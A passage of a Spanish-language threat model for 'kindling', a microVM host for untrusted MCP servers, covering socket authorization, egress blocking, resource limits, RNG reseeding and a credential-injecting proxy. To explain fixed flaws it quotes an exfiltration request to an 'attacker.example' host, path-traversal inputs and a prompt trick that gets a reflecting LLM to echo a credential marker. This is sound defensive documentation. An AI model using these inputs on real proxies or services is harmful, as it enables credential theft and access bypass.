# Modelo de amenaza

kindling existe para alojar **servidores MCP de terceros** invocados por un modelo. No se
sabe de antemano qué código va dentro, así que la premisa es:

> **El invitado es hostil.** Todo lo demás se deriva de ahí.

Lo que se protege es el host y la red de casa. Lo que hay dentro de una microVM se considera
perdido de antemano.

## Barreras, de fuera hacia dentro

### 1. El daemon no escucha en la red

`kling daemon` sirve **solo** en un socket Unix con permisos `0660`. Controlar microVMs
equivale a root en el host: puede montar discos arbitrarios y arrancar kernels arbitrarios.
Exponerlo por TCP sería repetir el error que ha costado a Docker una década de servidores
comprometidos.

El socket nace en un directorio privado (`0700`) junto al de destino, con `0660` y cedido
al usuario de `-socket-user` (o al de `sudo`) y a su grupo principal, y se renombra a su
sitio: el `chmod` y el `chown` no siguen un enlace que alguien ponga en la ruta mientras
el daemon arranca, y no hay un instante en que tenga los permisos del umask. Si otros
pueden escribir en el directorio del socket (sin sticky bit), el daemon lo avisa: podrían
cambiarlo por uno suyo.

El acceso remoto es **SSH y nada más**: `ssh host kling dial-stdio`. La autenticación es la
de SSH; kindling no inventa credenciales propias.

**Autorización por operación** ([docs/authz.md](docs/authz.md)). Sin política, quien alcanza
el socket manda sobre todo. Con `/etc/kling/authz.json` (o `kling daemon -authz`), el daemon
lee quién está al otro lado del socket con `SO_PEERCRED` (Linux) o `LOCAL_PEERCRED` (macOS)
—por SSH, el usuario remoto, que es quien lanza `dial-stdio`— y le da un rol: `admin` (todo),
`tenant:<nombre>` (solo las máquinas, snapshots y grafos con `kling.owner=<nombre>`, que pone
el daemon y el inquilino no puede fijar ni cambiar; lo ajeno responde 404) o ninguno (403). Un
único middleware decide por la acción que declara cada ruta; los listados y los eventos se
filtran por dueño. Volúmenes, carpetas del host, el store, construir imágenes y las métricas
del host son de admin. El fichero tiene que ser regular, de root o del usuario del daemon y no
escribible por otros; uno pedido que falta, o mal escrito, impide arrancar. root y el usuario
del daemon son siempre admin (pueden reescribir la política). Tokens de inquilino opcionales
(`KLING_AUTHZ_TOKEN`, guardados como sha256) que solo dan roles de inquilino. Cuotas por
inquilino opcionales (`quotas`: máquinas, memoria y disco lógico de lo que lleva su
`kling.owner`), que decide el manager en el mismo cerrojo en que da de alta la máquina:
dos creaciones a la vez no pasan las dos el tope; pasarse es un `429`.

Ese socket incluye `POST /machines/{ref}/guest`, que reenvía una petición HTTP al servidor
que corre dentro de una microVM. Es lo que permite importar un servicio desde un CLI remoto,
porque las IP de los invitados solo existen en la red del host. Amplía lo que puede hacer
quien alcance el socket, pero no por encima de lo que ya podía: quien controla el daemon
puede arrancar la máquina que quiera y hablarle igualmente. El proxy acota destino
—una máquina en marcha, un puerto, una ruta— y trunca la respuesta a 8 MiB para que un
invitado desbocado no agote la memoria del daemon.

### 2. Firecracker corre sin privilegios

El daemon necesita root para crear namespaces y dispositivos TAP. **El VMM no.** Firecracker
se lanza con `setpriv` bajo un usuario de servicio dedicado:

```
Uid:         999   999   999   999
Gid:         994   994   994   994
Groups:      103            (solo kvm)
CapEff:      0000000000000000
NoNewPrivs:  1
```

**Cero capacidades efectivas** y `no_new_privs`, así que un escape del VMM aterriza en un UID
sin permisos y sin forma de recuperarlos. El TAP se crea ya a nombre de ese usuario, para que
no necesite `CAP_NET_ADMIN` para abrirlo.

Cada microVM solo posee su propio directorio y su overlay. Las imágenes base y los snapshots
son de **solo lectura** para el VMM.

### 3. La microVM no alcanza la red privada

Cada máquina vive en su propio namespace de red. La política por defecto es **sin salida**:

| Política | Efecto |
|---|---|
| `none` (por defecto) | La microVM solo responde a quien la invoca. No inicia nada. |
| `internet` | Sale a internet. **Nunca** a redes privadas. |
| `allowlist` | Solo salen los dominios declarados con `-allow` (resolver dinámico DNS→ipset). **Fail-closed**: lo no declarado, y todas las redes privadas, quedan bloqueados. |

Un valor de egress desconocido es un **error**, no una caída al modo más permisivo, y la
política viaja con el snapshot del servicio: reimportar o curar un servicio la conserva.

El resolver de `allowlist` está acotado (en Linux; en macOS, desde §22, también el DNS de
`kling-vz`, en todos los modos): como máximo 32 consultas a la vez y ~200/s (ráfaga
400) por microVM; por encima de eso responde SERVFAIL en el sitio, sin abrir un socket al
upstream ni lanzar el `ip netns exec ... ipset add` que sembraría la ruta. Antes, un
invitado que repitiera una consulta A miles de veces por segundo hacía que el host abriera
igual número de sockets y forkeara igual número de procesos — un DoS del host, no de la
microVM. La respuesta del upstream también se valida (id de transacción y pregunta) antes de
sembrar el ipset con ella, para que una respuesta falsificada no abra una ruta que nadie
declaró.

Bloqueado siempre, incluso con `internet`:

```
10.0.0.0/8        privada
172.16.0.0/12     privada
192.168.0.0/16    privada — aquí vive la LAN de casa
169.254.0.0/16    link-local y metadatos de cloud
127.0.0.0/8       loopback del host
100.64.0.0/10     CGNAT
```

Verificado **desde dentro del invitado**, no desde el host:

```
RESULTADO 192.168.2.100: BLOQUEADO      (host Proxmox)
RESULTADO 192.168.2.1:   BLOQUEADO      (router de casa)
RESULTADO 10.10.10.1:    BLOQUEADO      (túnel WireGuard)
RESULTADO 169.254.169.254: BLOQUEADO    (metadatos de cloud)
RESULTADO 1.1.1.1:       ALCANZABLE
```

> **Cómo verificar esto de verdad.** Un `ip netns exec ... ping` mide el *namespace*, no la
> microVM: ese tráfico nunca pasa por `tap0` y por tanto no toca las reglas. La única prueba
> válida es ejecutar el comando **dentro del invitado**, por la consola serie. Nos costó dos
> falsos positivos aprenderlo.

**IPv6: cerrado, no solo ausente.** Todo lo de arriba (ipset, iptables, resolver dinámico)
es IPv4. Durante un diagnóstico en el lab real comprobamos que hoy no hay fuga v6 posible,
pero por una razón incidental: el host tiene `net.ipv6.conf.all.forwarding=0` de fábrica, no
por ninguna configuración de kindling, y `ip6tables` está vacío (policy `ACCEPT` en todas las
cadenas). Si ese valor del kernel cambiara algún día, no había nada en el código que
impidiera la fuga. Se cerró en dos capas independientes, ninguna depende de la otra:

1. `ipv6.disable=1` en la línea de arranque del invitado (`internal/net/net.go`, `BootArg`):
   el módulo IPv6 del kernel del invitado no carga, así que no hay ni siquiera una dirección
   link-local. Solo cubre arranques **en frío** — un snapshot dorado ya congelado no relee la
   línea de arranque al restaurar y sigue con el IPv6 que tenía al congelarse. Los dorados
   congelados desde este cambio lo saben (`guest_ipv6_off` en su meta) y los anteriores lo
   avisan solos al instanciarse; ver más abajo, en "Lo que NO está resuelto".
2. `applyIPv6Barrier` en el namespace del host (`internal/net/firewall.go`), aplicada en los
   **tres** modos de egress (`none`, `internet`, `allowlist`) y también en snapshots
   restaurados, no solo en arranques en frío: `sysctl disable_ipv6=1` en `tap0`, en el veth
   del namespace y en `all`/`default`, más `ip6tables FORWARD DROP` para lo que entre por
   `tap0` como cinturón adicional. Si `ip6tables` no está instalado en el host se avisa por
   log y se sigue sin fallar: la capa de `sysctl` es la que de verdad cierra el paso y no
   depende de ese binario.

**Excepción declarada por la imagen: `guest_ipv6_stack`.** Una receta con
`"guest_ipv6_stack": true` cambia la capa 1 por `ipv6.disable_ipv6=1`: el módulo IPv6
carga (hay sockets `AF_INET6`) pero ninguna interfaz arranca con IPv6, ni link-local. Es
para software que no escucha sin ellos: el `adbd` de Android solo abre `[::]:5555`, y el
`IpClient` de su `eth0` falla en bucle y le borra la IPv4 (prototipo Android, 29-09-2026).
El invitado, como root, puede encender IPv6 en una interfaz suya; la capa 2 no cambia y es
la que cierra el paso. Sus dorados quedan con `guest_ipv6_off` en false (dicen la verdad)
y no avisan al instanciarse, porque es lo declarado.

En macOS (`kling-vz`) no hace falta nada de esto: `egress.IsBlockedIP` ya trata cualquier
dirección que no sea IPv4 como bloqueada, porque el invitado nunca ha tenido IPv6 en ese
backend.

### 4. Una microVM no puede degradar a las demás

- **Caudal acotado** por dispositivo: 128 MiB/s de disco y 16 MiB/s de red, con limitadores
  de Firecracker.
- **Techo de CPU por máquina** con su propio cgroup (`-cpu-pct`, 50% de un core por
  defecto): un invitado en bucle no se come el host.
- **Tope de máquinas** (`MaxMachines = 256`) para que un cliente comprometido no agote el host.
- **RAM fija** por microVM; el invitado no puede pedir más. Y el VMM tampoco: su cgroup
  lleva `memory.max` (la RAM del invitado, o su techo `-mem-max`, más 64 MiB y 1/16 para
  el propio Firecracker y lo que KVM le cobra) y `pids.max` (128). Medido en el
  laboratorio con un Postgres de 512 MiB: recién arrancado, el cgroup ocupa 183 MiB; con
  el invitado llenando toda su RAM, ~500 MiB de un techo de 608, sin un solo evento
  `max` ni `oom`, y freeze y thaw siguen igual. `memory.max` no cuenta el swap: en un
  host con swap, `memory.swap.max` lleva el mismo techo, así que el VMM puede ir al swap
  bajo presión pero no sin límite (sin contabilidad de swap en el kernel no hay ni swap
  que acotar por cgroup). Si el host no delega los controladores `memory` o `pids`,
  queda solo el techo de CPU y el daemon avisa al arrancar de cuál falta.
- En el gateway, **cuotas por token/tenant**: varios clientes sobre un mismo token se
  reparten la capacidad en vez de matarse de hambre.
- **Consola serie acotada**: `firecracker.log` rota en el sitio (sin recrear el fichero, el
  VMM sigue escribiendo en el mismo descriptor) al pasar de 16 MiB, conservando el último
  1 MiB en `firecracker.log.1`. Un invitado que inunde su propia consola ya no puede llenar
  el disco del host; antes el fichero crecía sin tope mientras la microVM viviera.
  `kling logs` lee como mucho 4 MiB desde el final y nunca devuelve más de 10 000 líneas,
  con independencia de lo que pida `-tail`.

### 5. Aleatoriedad

Las instancias que restauran del mismo snapshot **clonan el estado del generador de
aleatoriedad** del invitado. Es un problema documentado por AWS: dos herramientas podrían
generar las mismas claves TLS.

Mitigación: cada microVM lleva un **virtio-rng**, y el kernel invitado tiene
`CONFIG_VMGENID=y`, así que detecta que viene de un snapshot y vuelve a sembrar su pool.

> El dispositivo de entropía debe estar presente **antes** de congelar: tras cargar un
> snapshot ya no se pueden añadir dispositivos.

Eso vale en Linux con Firecracker. En macOS, Virtualization.framework **no tiene VMGenID**:
dos réplicas del mismo snapshot devolvían los mismos bytes de `getrandom()` —el smoke test
del gateway vio `Mcp-Session-Id` idénticos en microVMs independientes— y el reloj de pared
seguía en la hora del volcado. Desde v0.9.1, en los dos sistemas, el daemon llama tras cada
restauración a `POST /resync` del agente con la hora del host y 64 bytes de `crypto/rand`;
el agente pone el reloj, mezcla la entropía acreditándola (`RNDADDENTROPY`) y fuerza la
resiembra (`RNDRESEEDCRNG`) antes de que la máquina se entregue.

Quién puede llamar a `/resync`: quien alcanza el puerto del agente. Eso es el host —el
daemon y los clientes de su socket, que ya mandan sobre todo— y **no** otros invitados (la
red privada y el loopback del host están bloqueados, ver 3). El propio invitado tampoco gana
nada: ya es root dentro. Lo que sí la alcanzaría es un proxy que reenvíe rutas de terceros al
puerto del agente, como el gateway de kindling-mcp; por eso `pkg/guest` exporta
`IsControlPath` y el gateway corta `/resync`, `/volume/*`, `/exec`, `/files` y `/dns`. Aun
así el agente valida: cuerpo de 4 KiB como mucho, entre 32 y 512 bytes de entropía y una hora
plausible. Mezclar bytes conocidos no resta entropía al pool (el kernel los combina con un
hash), así que lo peor que podría hacer un llamante indebido es mover el reloj.

Lo que no arregla: el estado aleatorio que un proceso ya sacó al espacio de usuario antes del
snapshot —el DRBG de OpenSSL de un `node` en marcha, el `random` de Python— sigue siendo el
mismo en todas las réplicas. Por eso los identificadores que importan para enrutar no se
toman del invitado: el gateway acuña los suyos (kindling-mcp v0.4).

### 6. Validación de entradas

Los nombres de snapshot llegan por la URL y se usan para construir rutas. Se validan contra
`^[a-zA-Z0-9][a-zA-Z0-9._-]{0,63}$` en **todos** los caminos —crear, leer y borrar— y no
solo al crear: un `../../etc` saldría del directorio de datos.

### 7. Secretos y credenciales

- **Un snapshot congelado nunca lleva secretos dentro.** Los secretos comunes se
  inyectan vía MMDS en la microVM **viva** (`kling machine secret`), y una máquina que
  los ha recibido **ya no puede congelarse** — se impone, no se aconseja. Los secretos
  por sesión de MMDS están retirados (ver punto 9 en "Lo que NO está resuelto").
- **El gateway no reenvía su propio token** ni al invitado ni a URLs de terceros: un
  servidor MCP comprometido no se lleva la credencial del agregador.
- **Las imágenes no son world-readable.** Contienen los ficheros `-env` de cada
  servicio; van con `chown` al usuario del servicio y permisos `0640`/`0750`.
- **La integridad de un dorado se comprueba** (sha256 de sus ficheros) antes de
  instanciarlo; el veredicto se recuerda y se re-verifica si tamaño o fecha cambian.
- **Un secreto por MMDS lo lee el invitado.** El almacén MMDS lo puede leer cualquier
  proceso root de dentro, y el servidor MCP corre como root: MMDS evita que el secreto
  acabe en un snapshot, no que el código hostil lo lea y lo saque por un dominio
  permitido.
- **Proxy de credenciales** (`kling machine credential`, `pkg/credproxy`, servido por `internal/net/credproxy.go`):
  la clave se queda en la memoria del daemon y el invitado recibe un marcador. Con
  egress allowlist, el resolver de la máquina contesta el dominio de la credencial con
  la IP del proxy (lado host del veth) y la IP real nunca entra en el ipset, así que no
  hay camino directo que lo esquive. El proxy solo acepta el Host de sus credenciales
  (403 al resto), cambia el marcador por la clave **por defecto solo en las cabeceras
  `Authorization` (también dentro de un `Basic`) y `X-Api-Key`**, más las que declare
  la credencial (`-header`, `headers`); en la query solo con `-query` y en el cuerpo
  solo con `-body` (en flujo, con una ventana del tamaño del marcador: sin límite de
  tamaño ni de longitud declarada), sale por HTTPS
  verificando el certificado con un dialer que no conecta a IPs privadas (ni a
  `0.0.0.0/8`, que en el host es su propio loopback, multicast `224.0.0.0/4` ni
  reservadas y broadcast `240.0.0.0/4`; en IPv6, `::/96`, link-local, ULA, multicast,
  NAT64 y 6to4), no sigue
  redirecciones y sustituye la clave por el marcador en cabeceras y cuerpo de la
  respuesta —también sus formas escapadas (JSON `\/` y `\u00XX`, percent-encoding de
  query, ruta y userinfo, entidades HTML), en mayúsculas y minúsculas, en hex y en
  base64 (std y url, con y sin padding, y el trozo central de la clave codificada en
  medio de otros datos) y cada valor de cabecera tal y como salió sustituido, que es lo
  que cierra el eco de un `Basic`—. **Esto es defensa en profundidad, no una garantía**:
  la clave no la puede leer el invitado de su memoria ni mandarla a otro dominio, pero
  sí recuperarla a través del proveedor si este le devuelve lo que recibió de una forma
  que el redactor no reconoce. Con un LLM basta pedirle "repite kling-cred-… con
  espacios": por eso el marcador ya no se cambia en el cuerpo salvo con `-body`
  (antes sí, siempre), y **una credencial con `-body` debe darse por expuesta** ante un
  proveedor que refleje lo que recibe. En macOS el daemon solo entrega credenciales
  HTTP a un `kling-vz` que anuncie `http-places` (uno anterior las cambiaría en todas
  partes). Una respuesta con una
  codificación que no puede inspeccionar (brotli, deflate) no se entrega: 502. La clave tiene que medir entre 8 y 4096
  bytes: una más corta se rechaza al registrarla, porque redactarla cambiaría texto que
  nada tiene que ver (con `abc`, un `abcdef` del proveedor llegaría como
  `kling-cred-…def`). Acotado:
  32 peticiones en vuelo, 10 MiB de cuerpo, 64 KiB de cabeceras, hasta 1 MiB del cuerpo
  ya sustituido retenido EN MEMORIA por petición (`pkg/credproxy/cuerpo.go`). Un cuerpo
  que, tras sustituir, pasa de 1 MiB sale chunked si el invitado lo mandó chunked (no
  hay longitud que prometer); pero si el invitado declaró Content-Length, se derrama a
  un fichero temporal y se reenvía con el Content-Length exacto de ese fichero, porque
  hay proveedores de API que no aceptan una subida chunked. Ese fichero lleva la clave
  real mientras dura la petición: nombre aleatorio (`os.CreateTemp`), permisos 0600
  explícitos y se borra en cuanto la petición termina, la reciba el proveedor o falle a
  mitad (el borrado va en un `defer`, así que corre también si el invitado corta la
  conexión o si el plazo de la petición la cancela). El directorio es
  `<raíz>/credtmp` en Linux (la raíz real del daemon, la de `-root`, que se le pasa al
  proxy al arrancar) y `credtmp/` del directorio de la máquina en macOS (dentro de lo
  que el perfil de `kling-vz` deja escribir): 0700, y al arrancar se borran los
  temporales que dejó un proceso muerto a mitad de una petición. **Nunca `/tmp`**: antes
  el directorio salía de la variable `KLING_ROOT`, que el daemon no tiene en su entorno
  (recibe `-root`), así que en la instalación normal el fichero con la clave caía en
  `os.TempDir()` y ahí se quedaba si el daemon moría de golpe. Si el directorio no se
  puede preparar, el proxy no escribe a disco: ese cuerpo sale chunked. Plazos:
  60 s hasta las cabeceras de la respuesta, 120 s de inactividad
  (cada byte en cualquier sentido los renueva, también el plazo de la conexión del
  invitado) y un techo de 15 min por petición: un stream largo de un LLM pasa, y un
  invitado que gotea bytes para retener una plaza no la retiene más de 15 min. Un corte
  aborta la conexión, así que el invitado ve un error y no una respuesta truncada que
  parezca completa.
- **La salida va siempre al Host de la credencial.** La URL hacia el proveedor se
  monta por campos (`https`, el Host con el que se eligió la credencial, la ruta y la
  query), nunca pegando el request-target del invitado tras el host. Antes un
  request-target opaco (`GET http:@attacker.example/x` con `Host: api.stripe.com`)
  salía hacia `https://api.stripe.com@attacker.example/x`: la clave, ya sustituida en
  las cabeceras, iba al atacante con TLS verificado contra él y sin pasar por la
  allowlist. Ahora se rechaza con 400, sin leer el cuerpo ni abrir la salida, todo
  request-target que no sea una ruta absoluta o el absolute-form `http(s)` del mismo
  Host: opaco, con usuario (`http://u@host/`), con otro esquema, hacia otro host o que
  no empiece por `/` (`OPTIONS *`). CONNECT sigue siendo un 405.
- **Permisos por método y ruta** (`-allow-request 'GET /v1/balance'`, `Allow` en la API):
  una credencial con permisos solo se sustituye en las peticiones que casan. Si ninguna
  credencial del Host casa, el proxy responde 403 y cierra la conexión sin leer el
  cuerpo ni abrir la salida. El método se compara exacto, contra una lista fija sin
  CONNECT ni TRACE. La ruta se decodifica y se normaliza con `path.Clean` antes de
  compararla (`/v1/../admin` y `/v1/%2e%2e/admin` valen `/admin`), y lo que se reenvía
  al proveedor es esa ruta normalizada: el proveedor ve lo mismo que se comprobó. Los
  patrones se validan al guardar: tienen que estar limpios, `*` no cruza `/` y `**` solo
  puede ir como último segmento. Con la lista vacía todo está permitido, igual que
  antes; un almacén cifrado sin `Allow` se sigue leyendo así. `Allow` viaja igual en
  macOS: `PUT /kling/credentials` lo lleva y `kling-vz` lo aplica con el mismo
  `pkg/credproxy`, no una reimplementación aparte.
  El 80 y el 443 de la IP del proxy van al proxy: un `https://dominio` desde dentro
  muere en el acto (3 ms medidos) en vez de esperar al plazo del SDK.
- **Rutas ambiguas, rechazadas antes de normalizar.** Con alguna credencial del dominio
  con `Allow`, el proxy mira la ruta CRUDA (`r.URL.EscapedPath()`, antes de decodificar)
  y responde 403 —sin leer el cuerpo ni abrir la salida— si lleva algo que un proveedor
  podría interpretar distinto de como lo hace `path.Clean`: una barra o un punto
  codificados (`%2F`, `%5C`, `%2E`), una barra invertida literal, una barra doble, un
  parámetro de ruta con `;` (tipo `;jsessionid=`), o un segmento `.`/`..` sin decodificar.
  Y después mira la ruta decodificada una vez, que es la que sale al proveedor: un `;`
  codificado (`%3B`), un `%` que quede tras decodificar (doble codificación, `%252e`),
  una barra invertida, una barra doble, un carácter de control o un segmento `.`/`..`
  también son 403. Antes `%3B` se colaba: `/public/..%3B/admin` casaba con
  `GET /public/**` y salía como `/public/..;/admin`, que Tomcat o Spring leen como
  `/admin`.
  No intenta adivinar qué haría el proveedor con eso: rechaza la ambigüedad en vez de
  arriesgarse a firmar una petición para una ruta que nunca se comprobó de verdad. Sin
  ninguna credencial con `Allow` esto no se mira, igual que antes de este cambio.
- **Registro de auditoría: metadatos del tráfico en disco** (`kling machine audit`,
  `GET /machines/{ref}/credaudit`, `pkg/credproxy/auditoria.go`). Cada petición que
  llega al proxy, también cada rechazo, deja una línea JSON en
  un fichero JSONL por máquina (0600, abierto con `O_APPEND`; dónde, abajo): hora, método, host,
  ruta, estado, motivo, si fue una denegación de política, los nombres (`Env`) de las
  credenciales que se sustituyeron de verdad, bytes y duración. **Esto es nuevo en
  disco**: antes el proxy no dejaba rastro de qué pedía el invitado; ahora queda qué
  endpoints de qué dominios usó y cuándo. Lo que NO se escribe nunca: la clave, el
  marcador, cabeceras, cuerpos, el contenido de la query (solo si la había) ni el texto
  de un error del proveedor. La ruta va normalizada y enmascarada: un segmento con un
  marcador (`kling-cred-`, sin mirar mayúsculas) o con cualquier forma escapada de
  alguna clave de la máquina sale como `:cred` (se busca en la ruta entera antes de
  partirla, por si la clave lleva `/`), uno de 32 o más caracteres de base64url/hex
  como `:tok`, los caracteres de control y los bytes que no son UTF-8 como `?` (la ruta
  llega decodificada y se lee en un terminal: nada de secuencias de escape del
  invitado), y la ruta se corta a 256 bytes (el host a 253). Rota a 4 MiB por
  generaciones (`.1`, `.2`, `.3`; `daemon.credaudit_max_mib` y
  `daemon.credaudit_generations`, o `KLING_CREDAUDIT=MIB:N`), así que ocupa como mucho
  ~16 MiB por máquina por defecto (unas 80 000 peticiones). Lo que se cae de la
  generación más antigua **también se cuenta**: sus líneas, y los descartados que
  llevaban, se suman a `dropped` (y a `rotated`) del primer registro del fichero
  nuevo. Antes había una sola generación de 1 MiB y la rotación pisaba el `.1` sin
  contar nada: de 20 000 peticiones quedaban 9 185 con `dropped=0`. `commit` y `fork`
  no lo copian y `rm` lo borra (todas las generaciones). La escritura no bloquea la petición: va por
  una cola de 1024 registros a una sola goroutine; con la cola llena el registro se
  descarta y se cuenta, y la cuenta viaja en el campo `dropped` del siguiente (o en una
  línea propia), nunca en silencio. **En Linux lo escribe el daemon (root) en
  `<root>/audit/<id>.jsonl`**, un directorio 0700 de root fuera del directorio de la
  máquina (`internal/machine/credaudit.go`). Antes vivía en `machines/<id>/`, que es
  del usuario sin privilegios del VMM: un Firecracker comprometido no podía leerlo ni
  desviar la escritura (`O_NOFOLLOW`, solo ficheros regulares), pero sí borrarlo,
  truncarlo o cambiarlo por otro, justo el registro que lo vigila. Ahora no lo alcanza.
  Al arrancar, el daemon migra los registros viejos: copia el contenido (con
  `O_NOFOLLOW`, solo si es un fichero regular con un único enlace; si no, lo descarta
  sin leerlo) a un fichero nuevo creado con `O_EXCL`, y borra el viejo; si ya hay uno
  nuevo, manda ese. Lo migrado vale lo que valía: estuvo en un directorio que el VMM
  podía tocar. También borra los registros de máquinas que ya no existen, y `rm` borra
  el de la suya. Si `<root>/audit` no se puede preparar (un enlace o un fichero en su
  sitio, otro dueño), el proxy no escribe registro y el daemon lo avisa: nunca vuelve
  al directorio del VMM. En macOS lo escribe el `kling-vz` de la máquina junto a su
  socket (`machines/<id>/credaudit.jsonl`, el único directorio en que su sandbox le deja
  escribir) y lo lee el daemon, sin seguir enlaces y solo con un único enlace; ahí el
  que escribe es el mismo proceso que atiende al invitado, así que moverlo no
  protegería nada (ver el plan de `docs/proxy-macos-separado.md`).
  El rechazo fuera de allowlist en macOS es ahora del propio proxy
  (`credproxy.Options.Enabled`), para que también quede en el registro.
- **Las credenciales viven cifradas en el host, nunca en un snapshot.** El marcador
  no es un secreto (la capacidad es la red del netns de esa máquina hacia su proxy, y
  el proxy sustituye por dominio, no por marcador), así que una máquina con
  credenciales se congela y se ramifica como cualquier otra. La clave se guarda en
  `machines/<id>/credentials.enc` (AES-256-GCM, clave derivada por HKDF de
  `secrets/snapshot.key`, id de máquina como dato autenticado, 0600) y en
  `secrets/credentials/<plantilla>.enc` para las de plantilla; `commit` no copia ese
  fichero, `rm` lo borra con el directorio, y `state.json`, eventos y logs solo llevan
  dominios. Tras un reinicio del daemon `reconcile` rehace proxy y resolver desde el
  almacén; tras un thaw se rehacen y se reponen los marcadores en MMDS. Verificado
  desde dentro del invitado en el lab (`scripts/90-e2e.sh`, secciones 7 y 7b).
- **En macOS (backend vz) el proxy vive en `kling-vz`, y la clave con él.** No hay
  veth ni resolver en el host: el mismo `pkg/credproxy` lo sirve cada `kling-vz` dentro
  de la pila de red gVisor de su máquina. Su DNS contesta el dominio con credencial con
  la pasarela (172.16.0.1, TTL 30) sin reenviar ni sembrar la IP real, y AAAA vacío; un
  listener en pasarela:80 recoge la conexión antes de la política de salida (que
  rechazaría 172.16/12); el 443 de la pasarela no tiene listener y muere con un RST. El
  proxy solo atiende en allowlist (403 en otro modo aunque el invitado conecte a mano;
  lo decide el propio proxy, así que el rechazo queda en su registro de auditoría),
  y su lookup usa el mismo upstream que el invitado y descarta además lo que la red del
  Mac nunca deja alcanzar: 0.0.0.0/8 (que en macOS llega a localhost), multicast,
  reservadas y las IPs del propio Mac.
  **Cambia el modelo de confianza**, y se acepta a sabiendas: en Linux la clave no sale
  del daemon; en macOS el daemon (que ya corre como el usuario, sin root) se la manda al
  `kling-vz` de esa máquina por su socket de API (`PUT /kling/credentials`; un socket Unix 0600 en
  el directorio de la máquina) y queda en la
  memoria de ese proceso, que corre como el mismo usuario. Lo que eso significa:
  - Ningún usuario nuevo puede leerla: quien es ese usuario ya leía el almacén cifrado y
    la clave maestra del daemon.
  - `kling-vz` es el proceso que termina el tráfico del invitado (pila TCP, DNS, MMDS).
    Un invitado que encontrara un fallo explotable ahí tendría la clave en la misma
    memoria; antes de este cambio, ese mismo fallo le daba un proceso sin claves. El
    perfil de sandbox (`kling-vz.sb`) sigue limitando qué ficheros y qué red toca (solo
    los de su máquina, §22), pero no protege la memoria del propio proceso.
  - La memoria del invitado vive en otro proceso (el auxiliar de Apple), así que la clave
    no entra en su volcado de estado ni en un snapshot. `kling-vz` no la escribe a disco
    ni a su log.
  - Un reinicio del daemon no la pierde (el `kling-vz` sigue vivo con ella). Un thaw
    arranca un `kling-vz` nuevo: el daemon se la entrega tras `PUT /kling/network` y
    antes de cargar el estado, así que el invitado despierta con el proxy listo.
  Verificado desde dentro del invitado en un Mac M4 (`scripts/92-e2e-mac.sh`, sección
  6c, con `kling-vz` confinado en su perfil): solo ve el marcador, el dominio resuelve
  a la pasarela, el proveedor recibe la clave real (basic-auth 200), eco y eco de
  `Basic` redactados, HTTPS directo rechazado en 1 ms, otro Host 403, la clave no
  aparece en el log del daemon ni en el de `kling-vz`, y sigue funcionando tras
  freeze/thaw y tras reiniciar el daemon.
- **Proxy de credenciales de Postgres** (`kling machine credential -type postgres`,
  `pkg/credproxy/postgres.go`, sin publicar). El mismo modelo con una contraseña de base
  de datos: el invitado recibe el marcador (en `PGPASSWORD`, por ejemplo), su resolver
  contesta el dominio del servidor con la IP del proxy, y el proxy entra en el servidor
  con la clave real. Qué hace y qué exige:
  - **El tramo del invitado va en claro, y es a propósito.** Un `SSLRequest` o
    `GSSENCRequest` recibe `N` (como un servidor sin TLS; como mucho dos), un ClientHello
    directo se cierra. Ese tramo no sale de la máquina (el veth de su netns en Linux, la
    pila gVisor de su `kling-vz` en macOS) y lo que viaja por él es el marcador. El
    proxy pide la contraseña en claro, la compara en tiempo constante con los marcadores
    de TODAS las credenciales Postgres de la máquina y así elige la credencial; después
    exige que el rol sea el de la credencial y, si la credencial fija base de datos, esa.
    Las conexiones de replicación, los parámetros repetidos y los arranques de más de
    10000 bytes se rechazan; las opciones `_pq_.`, la versión 3.1 y las 3.3+ se
    contestan con `NegotiateProtocolVersion` (3.0 o 3.2); 3.0 y 3.2 se hablan tal cual.
  - **Hacia el servidor, TLS verificado por defecto.** Sin `-upstream`, sale por el mismo
    dialer de solo IPv4 públicas que el proxy HTTP (un servidor en la red privada, en
    `169.254/16` o en loopback **se rechaza**, como un DNS envenenado), manda `SSLRequest` y lee la
    respuesta de un byte y sin buffer: una `N` es un fallo, nunca "entonces en claro", y
    lo que un intermediario inyecte detrás de la `S` no se cuela como si viniera dentro
    del TLS (CVE-2021-23214). TLS 1.2+, verificado contra el nombre de la credencial (o
    contra `-tls-server-name`, si el certificado lleva otro) con las raíces del sistema
    más `-ca-file` si se da. La autenticación es SCRAM-SHA-256,
    con `-PLUS` (`tls-server-end-point`) si el servidor lo ofrece, implementada aquí con
    la biblioteca estándar: nonce del servidor que alarga el nuestro, iteraciones entre
    4096 y 1 000 000, y la firma del servidor comprobada antes de dar nada por bueno (un
    `AuthenticationOk` sin ella se rechaza). La contraseña en claro solo va dentro de
    ese TLS verificado. MD5, GSS, SSPI y cualquier otro mecanismo se rechazan.
  - **Upstream fijado por el operador** (`-upstream host:puerto`, `pkg/credproxy/upstream.go`;
    ver [docs/postgres.md](docs/postgres.md)). Para una base de datos en el propio host
    (Docker publica en `127.0.0.1`) o en la LAN/VPC, el operador fija a dónde marca el
    proxy; el invitado sigue conectando al dominio de la credencial y no ve ni elige esa
    dirección. Solo se fija desde el host (CLI o API del daemon). Con ella se admiten el
    loopback y las IPs privadas, pero **nunca** `169.254.0.0/16` (metadatos), `0.0.0.0/8`,
    multicast, `240.0.0.0/4`, `fe80::/10`, `fd00:ec2::254` ni la red de kindling
    (`172.16.0.0/30`, el enlace del invitado, y `172.30.0.0/16`, los veth del host): ahí
    están el propio proxy y los invitados de otras máquinas. Un nombre se resuelve al
    marcar, con el resolver del sistema, y basta una IP prohibida entre sus respuestas
    para no marcar ninguna (`localhost` es siempre el loopback, sin DNS). En macOS
    `kling-vz` está confinado y no llega al resolver del Mac (abrirle el socket de
    mDNSResponder para esto no compensa): el nombre lo resuelve el daemon al entregar
    la credencial (`credproxy.ResolverUpstream`), con la misma regla —una IP prohibida
    o del rango de reenvíos entre las respuestas y no se entrega— y `kling-vz` recibe
    la primera IP, que vuelve a comprobar al marcar. El TLS se verifica contra el
    nombre de la credencial o `-tls-server-name`, no contra la IP. En Linux el proxy es del daemon y marca desde el netns del
    host (su `127.0.0.1` es el del host); en macOS lo hace `kling-vz` con la pila del
    Mac, no con la gVisor del invitado. El TLS sigue siendo verify-full, y la
    cancelación va al mismo upstream con el mismo modo.
  - **El loopback no llega a otras máquinas.** En macOS los invitados se exponen en
    `127.0.0.1` (los reenvíos de `kling-vz`), y un upstream del loopback podía dar con el
    de otra máquina. Los reenvíos se abren **solo** en el rango reservado
    `127.0.0.1:29000-29999` (el daemon rechaza un `kling-vz` que abra otro), y ningún
    upstream del loopback puede apuntar a ese rango: se rechaza al validar y otra vez al
    marcar, en el proceso que marca, que no necesita conocer los reenvíos de las demás
